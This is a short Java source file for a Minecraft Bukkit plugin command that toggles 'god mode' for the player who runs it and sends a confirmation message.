package net.milkbowl.vault.commands.cmds;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class God extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.god.contains(p.getName())) {
			plugin.god.remove(p.getName());
			p.sendMessage(Settings.PREFIX("God mode is now disabled"));
		} else {
			plugin.god.add(p.getName());
			p.sendMessage(Settings.PREFIX("God mode is now enabled"));
		}
	}
}
